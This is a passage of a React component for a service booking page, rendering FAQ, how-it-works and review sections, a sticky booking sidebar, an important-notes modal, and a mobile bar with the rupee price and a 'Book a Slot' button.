                <section className="p-6">
                  <h2 className="text-base font-bold text-gray-900 mb-4">FAQ</h2>
                  <FAQTab faqs={faqs}/>
                </section>
                <section className="p-6">
                  <h2 className="text-base font-bold text-gray-900 mb-4">How it Works</h2>
                  <HowItWorksTab duration={service.duration} online={service.meeting_mode !== 'offline'}/>
                </section>
                <section className="p-6">
                  <h2 className="text-base font-bold text-gray-900 mb-4">Reviews</h2>
                  <ReviewsTab reviews={reviews} avgRating={avgRating} ratingBreakdown={ratingBreakdown}/>
                </section>
              </div>
            </div>
          </div>

          {/* ── RIGHT: Sticky sidebar ── */}
          <div className="hidden lg:block lg:w-[320px] flex-shrink-0">
            <div className="sticky top-20 flex flex-col gap-5">
              <BookingCard service={service} onBookNow={handleBookNow} bookingFee={bookingFee} bookingFeeBreakdown={bookingFeeBreakdown} compact={!heroInView} motionOK={motionOK}/>
              <AdSpaceCard/>
            </div>
          </div>
        </div>
      </div>

      {/* ── Important Notes modal ── */}
      {notesModalOpen && service.important_note && (
        <>
          <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-sm" onClick={() => setNotesModalOpen(false)}/>
          <div className="fixed z-50 inset-0 flex items-center justify-center p-4 pointer-events-none">
            <div className="pointer-events-auto bg-white rounded-2xl shadow-xl max-w-lg w-full p-6 relative">
              <button type="button" onClick={() => setNotesModalOpen(false)}
                className="absolute top-4 right-4 text-gray-400 hover:text-gray-700 transition-colors"
                aria-label="Close">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
              </button>
              <div className="flex items-center gap-2 mb-4">
                <span className="flex items-center justify-center w-8 h-8 rounded-full bg-amber-100 text-amber-600">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                </span>
                <h3 className="text-lg font-bold text-gray-900">Important Notes</h3>
              </div>
              <p className="text-sm text-gray-700 leading-relaxed whitespace-pre-line">{service.important_note}</p>
            </div>
          </div>
        </>
      )}

      {/* ── Mobile: sticky bottom CTA bar ── */}
      <div className="lg:hidden fixed bottom-0 inset-x-0 z-40 flex items-center gap-3 bg-white border-t border-gray-200 shadow-[0_-4px_20px_rgba(0,0,0,0.06)] px-4 py-3 pb-[calc(0.75rem+env(safe-area-inset-bottom))]">
        <div className="relative flex-1 min-w-0">
          {service.price_on_request === true ? (
            <div className="text-base font-black text-gray-900 leading-none">Price on request</div>
          ) : service.price === 0 ? (
            <div className="text-xl font-black text-gray-900 leading-none">Free</div>
          ) : (
            <>
              <div className="flex items-baseline gap-1.5">
                <span className="text-xl font-black text-gray-900 leading-none">₹{service.price}</span>
              </div>
              {bookingFee > 0 && (
                <p className="text-[11px] text-gray-500 mt-0.5">+ ₹{bookingFee} platform fee &amp; tax</p>
              )}
            </>
          )}
        </div>
        <button onClick={handleBookNow}
          className="btn cta-press flex-shrink-0 inline-flex items-center gap-2 px-6 py-3 font-bold text-sm">
          Book a Slot
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
        </button>
      </div>
    </div>
  );
}
